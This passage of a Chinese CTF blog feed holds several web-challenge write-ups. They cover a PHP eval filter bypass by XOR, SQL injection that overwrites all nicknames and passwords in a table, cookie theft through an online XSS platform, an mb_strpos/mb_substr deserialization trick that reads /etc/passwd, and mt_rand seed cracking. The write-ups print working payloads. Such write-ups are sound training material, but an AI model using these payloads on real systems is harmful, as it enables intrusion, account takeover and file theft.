class="variable">$mess</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$mess</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$mess</span>);</span><br></pre></td></tr></table></figure><p>过滤了所有字母，但有字母，可以使用异或绕过。脚本：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!<span class="variable">@$</span><span class="variable">%^</span>*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span> <span class="comment">#可以用的符号</span></span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span>  <span class="comment">#要构造的命令</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c in answer:</span><br><span class="line">    <span class="keyword">for</span> i in valid:</span><br><span class="line">        <span class="keyword">for</span> j in valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">ord</span>(i)^<span class="keyword">ord</span>(j) == <span class="keyword">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(tmp1,tmp2)</span><br><span class="line">//0302181 <span class="variable">@[</span><span class="variable">@[</span>_^^ ，所以传入<span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;<span class="variable">@[</span><span class="variable">@[</span>_^^&quot;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mess</span>=<span class="variable">$_</span>=<span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span><span class="comment">;$_();</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129203748374.png" alt="image-20241129203748374"></p><blockquote><p>NSSCTF{3290ae33-f255-4d6b-9bba-2b1be6ddd485} </p></blockquote><h2 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h2><blockquote><p>考点：python,web,脚本编写</p></blockquote><p>直接上脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设这是我们要与之交互的网站的URL</span></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:28984/&#x27;</span>  <span class="comment"># 请替换为实际的URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个会话来保持cookie和其他会话信息</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则表达式模式来匹配数字或运算符，它们被&lt;div&gt;标签包围</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;div[^&gt;]*?&gt;([0-9+\-*\/=]+)&lt;/div&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环直到我们找到包含关键词&quot;ctf&quot;的页面</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="comment"># 发送GET请求来获取当前页面</span></span><br><span class="line">    response = session.get(url)</span><br><span class="line">    html_content = response.text</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用BeautifulSoup解析HTML内容</span></span><br><span class="line">    soup = BeautifulSoup(html_content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查找所有包含数字或运算符的&lt;div&gt;标签</span></span><br><span class="line">    divs = soup.find_all(<span class="string">&#x27;div&#x27;</span>, text=re.<span class="built_in">compile</span>(<span class="string">r&#x27;[0-9+\-*\/=]&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用正则表达式从标签中提取数字或运算符</span></span><br><span class="line">    tokens = pattern.findall(<span class="built_in">str</span>(divs))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 拼接成一个数学表达式（注意：这里假设表达式是简单的，没有括号）</span></span><br><span class="line">    <span class="comment"># 我们需要去除任何多余的空格和可能的=符号（它可能是表达式的一部分或用于提示用户输入）</span></span><br><span class="line">    <span class="comment"># 并且我们假设=符号后面不会紧跟数字或运算符（即它是表达式的结尾）</span></span><br><span class="line">    expression_parts = [token <span class="keyword">for</span> token <span class="keyword">in</span> tokens <span class="keyword">if</span> token != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    expression = <span class="string">&#x27;&#x27;</span>.join(expression_parts).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(expression)</span><br><span class="line">    <span class="comment"># 计算表达式的值（注意：这里使用eval有安全风险，但在本例中为了简化而使用）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error evaluating expression &#x27;<span class="subst">&#123;expression&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 为了避免过快地发送请求，我们添加了一个短暂的延迟（至少1秒）</span></span><br><span class="line">    <span class="comment"># 根据题目要求，我们不能在1秒内回答一个问题，所以这里使用0.5秒的延迟</span></span><br><span class="line">    time.sleep(<span class="number">1.1</span>)</span><br><span class="line">    <span class="comment"># 准备POST数据</span></span><br><span class="line">    post_data = &#123;<span class="string">&#x27;ans&#x27;</span>: result&#125;</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment"># 发送POST请求将答案发送回服务器</span></span><br><span class="line">    post_response = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查响应内容是否包含关键词&quot;ctf&quot;</span></span><br><span class="line"><span class="built_in">print</span>(post_response.text)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 关闭会话</span></span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><blockquote><p>NSSCTF{32a5eadd-b078-4e0c-9570-1b2852476085}</p></blockquote><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><blockquote><p>考点：sql注入</p></blockquote><p>先扫一下目录，发现源码，审计源码，发现sql注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231234785.png" alt="image-20241129231234785"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231223286.png" alt="image-20241129231223286"></p><p>根据提示，存在sql注入，直接sqlmap扫</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129230333540.png" alt="image-20241129230333540"></p><p>发现在年龄处存在sql注入漏洞，且根据payload可以看出是数字型注入</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改当前表所有nickname为444</span><br><span class="line">nickname=aa&amp;age=11,nickname=444%23&amp;description=111&amp;token=</span><br><span class="line">修改当前表所有password为123</span><br><span class="line">nickname=aa&amp;age=11,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=111&amp;token=</span><br><span class="line"><span class="punctuation">#</span>0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’))</span><br><span class="line"><span class="punctuation">#</span><span class="keyword">urlencode</span><span class="params">(#)</span>=%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231014113.png" alt="image-20241129231014113"></p><blockquote><p>NSSCTF{3a6a5fad-87c3-4a7a-a6b6-35f1a532b42e}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS在线平台使用</title>
      <link href="/posts/169f5f8e.html"/>
      <url>/posts/169f5f8e.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mb_strpos与mb_substr错位索引</title>
      <link href="/posts/c81521cb.html"/>
      <url>/posts/c81521cb.html</url>
      
        <content type="html"><![CDATA[<h2 id="mb-strpos与mb-substr错位索引"><a href="#mb-strpos与mb-substr错位索引" class="headerlink" title="mb_strpos与mb_substr错位索引"></a>mb_strpos与mb_substr错位索引</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span> mb_substr和mb_strpos函数漏洞</span><br><span class="line">mb_strpos() 和 mb_substr() 是 PHP 中用于处理多字节字符的函数，专门用于处理 UTF<span class="number">-8</span> 或其他多字节编码的字符串。</span><br><span class="line">(<span class="number">1</span>)mb_strpos: 用于查找一个字符串在另一个字符串中第一次出现的位置（索引），返回结果是该子字符串第一次出现的位置（索引）。</span><br><span class="line">mb_strpos(<span class="built_in">string</span> $haystack, <span class="built_in">string</span> $needle, <span class="built_in">int</span> $offset = <span class="number">0</span>, <span class="built_in">string</span> $encoding = <span class="literal">null</span>): <span class="built_in">int</span>|<span class="literal">false</span></span><br><span class="line">    $haystack：要在其中搜索子字符串的源字符串。</span><br><span class="line">    $needle：要搜索的子字符串。</span><br><span class="line">    $offset（可选）：从哪个位置开始搜索，默认为 <span class="number">0</span>。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)mb_substr: 用于获取一个字符串的子串，返回结果是指定位置和长度的子字符串。</span><br><span class="line">mb_substr(<span class="built_in">string</span> $string, <span class="built_in">int</span> $start, <span class="built_in">int</span> $length = <span class="literal">null</span>, <span class="built_in">string</span> $encoding = <span class="literal">null</span>): <span class="built_in">string</span>|<span class="literal">false</span></span><br><span class="line">    $string：要截取的原始字符串。</span><br><span class="line">    $start：截取的起始位置。如果是负数，则表示从末尾开始计数。</span><br><span class="line">    $length（可选）：要截取的长度。如果未指定，则默认截取至字符串的末尾。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当以 <span class="string">\xF0</span> 开头的字节序列出现在 UTF-<span class="number">8</span> 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-<span class="number">8</span> 编码规范定义了以 <span class="string">\xF0</span> 开头的字节序列用于编码较大的 Unicode 字符。</span><br><span class="line">不符合<span class="number">4</span>位的规则的话，mb_substr和mb_strpos执行存在差异：</span><br><span class="line">(<span class="number">1</span>)mb_strpos遇到<span class="string">\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析</span></span><br><span class="line">mb_strpos(<span class="string">&quot;\xf0\x9fAAA&lt;BB&quot;</span>, <span class="string">&#x27;&lt;&#x27;</span>); <span class="comment">#返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)mb_substr遇到<span class="string">\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析</span></span><br><span class="line">mb_substr(<span class="string">&quot;\xf0\x9fAAA&lt;BB&quot;</span>, <span class="number">0</span>, <span class="number">4</span>); <span class="comment">#&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</span></span><br><span class="line"></span><br><span class="line">结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动</span><br></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span> mb_substr和mb_strpos函数漏洞与本题结合</span><br><span class="line">通过控制C的长度可以控制我们想要执行$key的长度</span><br><span class="line">通过控制B我们可以控制索引值需要提前几位</span><br><span class="line">每发送一个%f0abc，mb_strpos认为是<span class="number">4</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">3</span>个字节</span><br><span class="line">每发送一个%f0%9fab,mb_strpos认为是<span class="number">3</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">2</span>个字节</span><br><span class="line">每发送一个%f0%9f%9fa,mb_strpos认为是<span class="number">2</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">1</span>个字节</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>审计上述代码，发现传入参数start和read，会拼接read和realfile的序列化。</p><p>根据代码知道，在调用函数截取的时候是以 “[” 开始的，但是read里面又不能有 “[”，所以一定只能截取[]内的序列化。但是只有变量start是可控的，其它不可控，看似无解，但可利用上述的漏洞，让其发生错位索引，从而执行我们自己传入的序列化列表。</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果start=gxngxngxn，序列化为：</span><br><span class="line"><span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;gxngxngxn&quot;</span></span>;<span class="symbol">s:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;filename&quot;</span></span>;<span class="symbol">s:</span><span class="number">11</span><span class="symbol">:<span class="string">&quot;/etc/passwd&quot;</span></span>;&#125;</span><br><span class="line"></span><br><span class="line">如果我们自己构造一个序列化表传入，start=<span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;gxngxngxn&quot;</span></span>;<span class="symbol">s:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;filename&quot;</span></span>;<span class="symbol">s:</span><span class="number">55</span><span class="symbol">:<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span></span>;&#125;</span><br><span class="line">序列化结果为：</span><br><span class="line"><span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">126</span><span class="symbol">:<span class="string">&quot;O:9:&quot;</span>read_file<span class="string">&quot;:2:&#123;s:5:&quot;</span>start<span class="string">&quot;;s:9:&quot;</span>gxngxngxn<span class="string">&quot;;s:8:&quot;</span>filename<span class="string">&quot;;s:55:&quot;</span>php</span><span class="symbol">://filter/convert</span>.base64-encode/resource=<span class="regexp">/etc/passwd</span><span class="string">&quot;;&#125;&quot;</span>;<span class="symbol">s:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;filename&quot;</span></span>;<span class="symbol">s:</span><span class="number">11</span><span class="symbol">:<span class="string">&quot;/etc/passwd&quot;</span></span>;&#125;</span><br><span class="line"></span><br><span class="line">相比较，前面多了一串：</span><br><span class="line"><span class="symbol">O:</span><span class="number">9</span><span class="symbol">:<span class="string">&quot;read_file&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;start&quot;</span></span>;<span class="symbol">s:</span><span class="number">126</span><span class="symbol">:<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="symbol">刚好多了38个字符，就可以通过传参read来利用上述漏洞，让他们错位38个索引</span></span></span><br></pre></td></tr></table></figure><blockquote><p>payload:</p></blockquote><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?read=<span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0abc</span><span class="meta">%f0</span><span class="meta">%9f</span><span class="meta">%9fa</span><span class="meta">%f0</span><span class="meta">%9f</span><span class="meta">%9fa</span>&amp;<span class="keyword">start</span>=O:<span class="number">9</span>:<span class="string">&quot;read_file&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;gxngxngxn&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">55</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接下来分析一下，传进去后，在传入截取函数前，它们会组合成：</p><p>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa[O:9:”read_file”:2:{s:5:”start”;s:126:”O:9:”read_file”:2:{s:5:”start”;s:9:”gxngxngxn”;s:8:”filename”;s:55:”php://filter/convert.base64-encode/resource=/etc/passwd”;}”;s:8:”filename”;s:11:”/etc/passwd”;}]</p><p>根据上述漏洞，mb_strpos索引”[“时，会索引到 12x4+2x2+1-1 = 52，即”[“下标是52</p><p>mb_substr在截取时，就会从下标为53的截取。 53=12x1+1x2+1+38+1-1，刚好绕过了前面的38个字符串，从而反序列化我们自己传入的序列化表。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机数种子爆破</title>
      <link href="/posts/b4b5a295.html"/>
      <url>/posts/b4b5a295.html</url>
      
        <content type="html"><![CDATA[<h2 id="随机数种子爆破"><a href="#随机数种子爆破" class="headerlink" title="随机数种子爆破"></a>随机数种子爆破</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165931510.png" alt="image-20241116165931510"></p><p>在PHP中，变量以$符号开头，后面拼接变量名。上述代码的基本 含义是:从$str变量中随机取32次字符(字符可重复)，并拼接成字符 串，最后将该字符串赋值给变量$password。执行代码后会输出 $password变量的前10个字节，此时通过POST请求传递password参数到 服务端，如果password参数的值与$password变量的值完全相等，那么 就会输出flag。</p><p>理论上，如果选取字符的时候是完全随机的，那么几乎不可能出现 password参数值与$password变量值相等的情况(概率极低)。但由于 代码中使用mt_rand()函数来生成随机数，因此如果可以得知该函数生 成的一段随机数序列，就可以通过工具爆破出其选取的随机数种子 (该种子由$_Session[‘seed’]变量生成)，从而预测之后的所有随机数序 列。在这里，我们使用php_mt_seed工具来爆破随机数种子。该工具的 下载地址为:<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-">https://www.openwall.com/php_mt_seed/php_mt_seed-</a> 4.0.tar.gz</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165647076.png" alt="image-20241116165647076"></p><p>访问题目页面，可得到前10个字节的随机字符，将输出的随机字符转换为php_mt_seed可识别的数据格式。使用</p><p>Python3脚本进行转换:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165703575.png" alt="image-20241116165703575"></p><p>str1变量的值就是PHP代码中的$str的值，str2变量的值就是PHP代码中 输出的$password的前10个字节。这段代码的基本作用就是将$password 中的前10个字节(即变量str2)进行定位，得到其在str1中的具体下标 位置，然后按照具体格式输出。以str2中的第一个字母A为例，字母A 在变量str1中的下标是36(字符串下标从0开始)</p><p>将输出的字符输入到编译好的php_mt_seed工具中，具体指令如下:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165734372.png" alt="image-20241116165734372"></p><p>最终我们找到一个随机数种子 19290735(PHP7.1)。在这一步需要注意的是，mt_rand()函数本身确 实存在问题，但是根据PHP版本的不同，其生成的随机数会略有区别。 所以，在实际题目中一定要注意PHP版本问题，不能脱离PHP版本来做 题。</p><p>利用得到的随机数种子编写PHP脚本，如下所示:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165751773.png" alt="image-20241116165751773"></p><p>尝试将该结果提交给服务端，即可成功得到flag。</p><p>本质上是因为mt_rand()函数的不安全性导致的。所以，我们需要明确 以下几点:</p><p>1) mt_rand()函数的不安全性是考点的核心。 </p><p>2)要爆破随机数种子，首先需要得到mt_rand()函数生成的随机数序</p><p>列。</p><p>3)mt_rand()函数生成的随机数序列可能以不同的形式表现(例如生成 